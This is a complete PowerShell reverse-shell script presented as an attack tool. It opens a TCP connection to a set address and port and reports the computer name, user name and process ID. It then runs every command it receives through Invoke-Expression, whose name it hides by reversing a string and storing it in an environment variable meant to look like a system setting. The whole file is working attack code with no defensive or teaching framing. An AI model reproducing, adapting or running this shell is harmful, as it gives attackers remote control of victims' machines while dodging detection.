# Environment Variable Executor Reverse Shell
# Hides the execution primitive in a process environment variable

$env:SYS_HANDLER = "XEI"[-1..-3] -join ""
$host_addr = "192.168.0.100"
$host_port = 4444

try {
    $tcp = [System.Net.Sockets.TcpClient]::new()
    $tcp.Connect($host_addr, $host_port)
    $stream = $tcp.GetStream()

    $writer = [System.IO.StreamWriter]::new($stream)
    $writer.AutoFlush = $true
    $reader = [System.IO.StreamReader]::new($stream)

    $writer.WriteLine("[*] Session: $env:COMPUTERNAME | User: $env:USERNAME | PID: $PID")
    $writer.Write("[$host_addr] $> ")

    while ($tcp.Connected) {
        $input_cmd = $reader.ReadLine()
        if ($input_cmd) {
            try {
                $handler = [System.Environment]::GetEnvironmentVariable("SYS_HANDLER")
                $output = & $handler $input_cmd 2>&1 | Out-String
                $writer.WriteLine($output)
                $writer.Write("[$host_addr] $> ")
            } catch {
                $writer.WriteLine("Exception: " + $_.Exception.Message)
                $writer.Write("[$host_addr] $> ")
            }
        }
    }
} catch { exit }
finally { if ($tcp) { $tcp.Close() } }
